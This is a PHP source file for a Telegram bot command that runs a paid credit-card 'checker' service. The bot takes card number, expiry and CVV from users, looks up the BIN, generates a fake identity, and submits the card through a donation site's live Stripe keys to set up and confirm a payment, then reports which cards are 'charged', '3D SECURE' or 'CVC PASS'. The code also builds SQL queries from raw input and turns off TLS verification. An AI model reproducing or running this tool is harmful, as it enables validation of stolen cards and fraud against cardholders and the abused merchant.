<?php
if(strpos($message, '!sto') === 0 or strpos($message, '/sto') === 0 or strpos($message, '.sto') === 0){
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace('/\s/', '|', $lista);
$vaut = array(1,2,6,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
$che = bannedbin($bin);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.saveiman.com/api/non_oauth/stripe_intents/setup_intents/create');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.saveiman.com',
'accept: application/json',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile DuckDuckGo/5 Safari/537.36',
'content-type: application/json',
'origin: https://www.saveiman.com',
'x-requested-with: com.duckduckgo.mobile.android',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.saveiman.com/donation-page1',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
'cookie: __cf_bm=b73a4fe99dbd5c6402426ed2ff3083844013443b-1627993170-1800-AR42QlvJUNrKkucuW07/ZnsNhI1/BbGrrqBdAuaKgeGCVR11nQ0sanEkAFqp4TMwiNLXBt9QUynjbqC2ENeILvL3HcotIXNSnEGdxhlAzpiR',
'cookie: addevent_track_cookie=8142b81f-94d7-4796-e84f-1e3d673f3fe0',
'cookie: cf:aff_sub2=',
'cookie: cf:aff_sub3=',
'cookie: cf:aff_sub=',
'cookie: cf:affiliate_id=',
'cookie: cf:cf_affiliate_id=',
'cookie: cf:content=',
'cookie: cf:medium=',
'cookie: cf:name=',
'cookie: cf:source=',
'cookie: cf:term=',
'cookie: cf:NDgxNDc2ODg=:visited=true',
'cookie: cf:visitor_id=2014c629-c975-4b20-8ec1-dc6a2b01bc29',
'cookie: is_eu=false',
'cookie: o0bbqfoaqiyt3vvz=true',
'cookie: 7228020_viewed_3=51',
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"page_id":"dm95R3NEbE9kU21weEZhMkN1N3A3dz09LS1NN1dCb2I3am1NbHAyWnFiYkZGNm1BPT0=--ffc0c4fe98bece6a0df3eacac45248834f19031c","stripe_publishable_key":"pk_live_BC0qtENgeicsZ9mG90hfis6U00u5xdTi8c","stripe_account_id":"acct_1EXqH5Bflqc6bhi6"}');
    $result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    $cs = $cap1['client_secret'];
    sendMessage1($cs);
    $id1 = trim(strip_tags(getStr($result, 'client_secret":"','_secret')));
        sendMessage1($id1);

curl_close($ch);
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
if (strpos($result, 'client_secret')){
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/$id1/confirm");
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    "user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''))",
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=3+Allen+Street&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][postal_code]=10002&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F369706cd7%3B+stripe-js-v3%2F369706cd7&payment_method_data[time_on_page]=98723&payment_method_data[referrer]=https%3A%2F%2Fwww.saveiman.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_BC0qtENgeicsZ9mG90hfis6U00u5xdTi8c&_stripe_account=acct_1EXqH5Bflqc6bhi6&client_secret='.$cs.'');
$result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    $ccc = preg_replace('/_/', ' ', ucfirst($cap1["error"]['decline_code']));
    $code = preg_replace('/_/', ' ', ucfirst($cap1["error"]['code']));
    $res = $cap1["error"]['message'];
    $cvc_check = trim(strip_tags(getStr($result,'"cvc_check":"','"')));
curl_close($ch);
        sendMessage1($result);
}

// if (strpos($result, 'client_secret')){
// $ch = curl_init();
    // curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/seti_1JKMcRBflqc6bhi6qsane7tK/confirm");
    // curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    // curl_setopt($ch, CURLOPT_HEADER, 0);
    // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    // 'accept: application/json',
    // 'accept-language: es-ES,es;q=0.9',
    // 'content-type: application/x-www-form-urlencoded',
    // 'origin: https://js.stripe.com',
    // 'referer: https://js.stripe.com/',
    // 'sec-fetch-dest: empty',
    // 'sec-fetch-mode: cors',
    // 'sec-fetch-site: same-site',
    // "user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''))",
    // ));
    // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    // curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=3+Allen+Street&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][postal_code]=10002&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]=23&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F369706cd7%3B+stripe-js-v3%2F369706cd7&payment_method_data[time_on_page]=98723&payment_method_data[referrer]=https%3A%2F%2Fwww.saveiman.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_BC0qtENgeicsZ9mG90hfis6U00u5xdTi8c&_stripe_account=acct_1EXqH5Bflqc6bhi6&client_secret=seti_1JKMcRBflqc6bhi6qsane7tK_secret_JyJEGVziegl7uPVsISw80dSdiP6EQIk');
// $result = curl_exec($ch);
    // $cap1 = json_decode($result, true);
    // $ccc = preg_replace('/_/', ' ', ucfirst($cap1["error"]['decline_code']));
    // $code = preg_replace('/_/', ' ', ucfirst($cap1["error"]['code']));
    // $res = $cap1["error"]['message'];
    // $cvc_check = trim(strip_tags(getStr($result,'"cvc_check":"','"')));
// curl_close($ch);
// }
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (strpos($result, 'state": "succeeded')){
  $status = 'succeeded✅';
  $cc_code = "Charged 4$";
  cvv($list);
}elseif (strpos($result, 'status": "succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged 4$";
  cvv($list);
}elseif (strpos($result, 'succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged 4$";
  cvv($list);
}elseif (strpos($result, 'requires_action')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'redirect_to_url')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'requires_payment_method')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'payment_failed')) {
  $status = 'Falied❌';
  $cc_code = "Payment failed";
  cvv($list);
}elseif (strpos($result, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVC PASS';
  rest($list);
}elseif (strpos($result1, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  cvv($list);
}elseif (!strpos($result, 'error')){
  $status = 'succeeded✅';
  $cc_code = "Charged 4$";
  cvv($list);
}
if(empty($ccc) and !empty($res)){
    $ccc = 'Card declined';
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}if(!empty($code)){
    $code = $code;
}elseif(empty($code)){
    $code = 'none';
}

if(empty($result) or empty($ccc) or empty($code) or empty($res)){
$result = urlencode("<b>
GATE --> STRIPE - CHARGE 25USD
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Code ->> Request not executed
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[$role]
Credit Left ->> ${balance}💰
Bot By --> <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}


$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$result = urlencode("<b>
GATE --><i> STRIPE - CHARGE 25USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Code ->> $code
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>